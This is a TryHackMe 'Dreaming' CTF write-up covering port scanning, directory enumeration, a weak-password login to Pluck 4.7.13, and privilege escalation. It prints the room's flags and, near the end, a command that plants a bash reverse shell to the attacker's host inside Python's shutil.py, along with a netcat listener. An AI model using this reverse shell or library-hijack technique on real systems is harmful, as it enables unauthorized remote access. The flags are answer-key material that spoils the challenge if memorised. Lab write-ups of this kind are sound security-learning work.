<p align="center">November 6, 2024</p>
<p align="center">Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{184}}$$-day-streak in  <a href="https://tryhackme.com/r/hacktivities">TryHackMe</a>.</p>

<h1 align="center">
  $$\textcolor{#3bd62d}{\textnormal{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dreaming &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}}$$
</h1>
<p align="center">Solve the riddle that dreams have woven..</p>
<p align="center">Access this 🆓 TryHackMe CTF Room clicking <a href="https://tryhackme.com/r/room/dreaming">Dreaming</a>.</p><br>
<p align="center">
  <img height="150px" hspace="20" src="https://github.com/user-attachments/assets/2114a0d6-560b-450b-b9f8-b1c32ac26b31">
  <img height="150px" src="https://github.com/user-attachments/assets/807a0e86-31df-4bd9-aeb5-74b9cd78da8c">
</p>

<p align="center">Summary</p>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [Recover the Kingdom](#1) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [Lucien](#2) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [Death](#3) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [Morpheus](#4) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp;[Room Complete](#5) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [My journey](#6)

<br>
<br>
<br>
<h2>Task 1. Recover the Kingdom!<a id='1'></a></h2>

<br>
<p align="center">While the king of dreams was imprisoned, his home fell into ruins.<br>
Can you help Sandman restore his kingdom?</p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>
<br>

> 1.1. <em>What is the Lucien Flag?</em><br><a id='2'></a>
>> <code><strong>THM{TH3_L1BR4R14N}</strong></code><br><br>

<pre><code>root@ip-[Attack_IP]:~/Dreaming# nmap -sC -sV [Target_IP]

Starting Nmap 7.60 ( https://nmap.org ) at 2024-11-07 02:50 GMT
Nmap scan report for ip-[Target_IP].eu-west-1.compute.internal ([Target_IP])
Host is up (0.00037s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:EB:CF:87:A9:37 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.56 seconds
root@ip-[Attack_IP]:~/Dreaming# 
</code></pre>

<br>

<pre><code>root@ip-[Attack_IP]:~/Dreaming# gobuster dir -u http://[Target_IP] -w /usr/share/dirb/wordlists/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://[Target_IP]
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/app                  (Status: 301) [Size: 308] [--> http://[Target_IP]/app/]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/index.html           (Status: 200) [Size: 10918]
/server-status        (Status: 403) [Size: 276]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
root@ip-[Attack_IP]:~/Dreaming# 
</code></pre>

<br>

![image](https://github.com/user-attachments/assets/bc02a816-5cf0-4601-b3df-da9f550dd7fc)

<br>

![image](https://github.com/user-attachments/assets/782e48ce-568a-428c-8ec3-a0a72b1ea93f)

<br>

![image](https://github.com/user-attachments/assets/334f82cc-8eff-420a-baf6-6491e757a8b2)

<br>

![image](https://github.com/user-attachments/assets/b78820ad-76fc-4df8-9c3b-e6734c277a44)

<br>
<p>We can see from above that the pluck version is 4.7.13.</p><br>
<p>I tried <code>password</code>.</p>

![image](https://github.com/user-attachments/assets/f38e9980-c933-468c-8d0c-f54cec1614e0)

<br>
<p>It worked and redirected me to the following page.</p>

![image](https://github.com/user-attachments/assets/a1f5d456-4074-420a-a206-1d2bc92233f4)

<br>
<p>Next I researched Pluck 4.7.13 in Exploit Database.</p>


![image](https://github.com/user-attachments/assets/4d08434e-5640-4512-8a8d-055e9f6144e3)

<br>


![image](https://github.com/user-attachments/assets/45250975-64b2-4618-96b5-6bb716313468)

<br>

![image](https://github.com/user-attachments/assets/ef719f69-c44b-41c9-b924-0792bf395c89)

![image](https://github.com/user-attachments/assets/68ebeebf-a4b1-4ee6-b62e-cd46858709fb)

![image](https://github.com/user-attachments/assets/7a143b4b-b679-47a3-9476-6bef6154842e)

![image](https://github.com/user-attachments/assets/88d5c838-399a-4a75-b21a-c9379215446f)

![image](https://github.com/user-attachments/assets/bfc77dee-c990-4d95-aab1-4488f4e836ff)

![image](https://github.com/user-attachments/assets/e44ca9b7-59bf-4b7f-bf69-c47d6525c5b7)

![image](https://github.com/user-attachments/assets/10767471-a71d-4e7f-bd8d-0ce627954d51)

![image](https://github.com/user-attachments/assets/08068aa8-3285-4123-ba7f-1d9ee548864c)

![image](https://github.com/user-attachments/assets/ab445633-5bb1-499a-b4df-2585a8905614)

![image](https://github.com/user-attachments/assets/f966bd82-4c8d-4a2d-9781-6afd46a0deb9)

![image](https://github.com/user-attachments/assets/dd40f283-5fba-4cbf-9a14-a41ef2b6e667)

![image](https://github.com/user-attachments/assets/e56cf1dc-16b6-4094-8152-ed84c3217782)

![image](https://github.com/user-attachments/assets/9b2b716f-ff1d-4708-b720-0e9f588ee91a)

![image](https://github.com/user-attachments/assets/ff2800c1-b5a2-4fb4-9c22-c8668e93a5ce)

![image](https://github.com/user-attachments/assets/329bd066-9a0d-42ac-bb8c-453e4f2758d2)

<br>

> 1.2. <em>What is the Death Flag?</em><br><a id='3'></a>
>> <code><strong>THM{1M_TH3R3_4_TH3M}</strong></code><br>

![image](https://github.com/user-attachments/assets/d52108f7-5b85-4f33-bbff-b8a3531fedc1)

![image](https://github.com/user-attachments/assets/1a7c3741-413f-4da3-8a97-e92cb3e38dd1)

![image](https://github.com/user-attachments/assets/31a9264b-9048-43fa-b964-59b3a6ab0453)

![image](https://github.com/user-attachments/assets/01f82d3d-2bbf-4870-affa-a96585586b63)

<br>

![image](https://github.com/user-attachments/assets/50ccdd15-8b50-40c4-b983-b96c45d38839)

<br>

> 1.3. <em>What is the Morpheus Flag?</em><br><a id='4'></a>
>> <code><strong>THM{DR34MS_5H4P3_TH3_W0RLD}</strong></code><br><br>

![image](https://github.com/user-attachments/assets/5a6ca1d3-4b61-490c-9980-f36731e6a87f)

<br>

<pre><code>$ find / type f -group morpheus 2>dev/null
</code></pre>

<br>

<pre><code>root@ip-[Attack_IP]:~/Dreaming# nc -nvlp 4444
</code></pre>

<br>

<pre><code>death@dreaming:/$ echo "import os;os.system(\"bash -c 'bash -i >& /dev/tcp/[Attack_IP]/[Attack_Port] 0>&1'\")" > /usr/lib/python3.8/shutil.py
</code></pre>

<br>

![image](https://github.com/user-attachments/assets/41d937b6-954f-42af-a92b-fee86b4d44e0)

<br>

![image](https://github.com/user-attachments/assets/bec30477-f483-4659-b661-c99c7a98d18a)




<h2>Room Complete<a id='5'></a></h2>
<p>Keep learning, keep growing!<br>

![image](https://github.com/user-attachments/assets/cb70a52b-7d88-4d0a-9bf3-420b3231bd3d)

<br>

<h2>My Journey<a id='6'></a></h2>
<p></p>Following I share the status of my journey in TryHackMe.</p>

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     |
| :---------------: | :------- | :----------- | :----------- | :---------- | :--------- | :------  | :-------- |
|                   |          | WorldWide    | Brazil       | WorldWide   | Brazil     |          | Completed |
| November 6, 2024  | 184      |       1,294ª |          28ª |      4,393ª |        64ª | 53,730   |       403 |

![image](https://github.com/user-attachments/assets/fe4b725c-f7fa-4037-9ab7-20250b953795)

<br>

<p style="text-align: center;">Thank you for coming. Hope to learn together again!!</p>
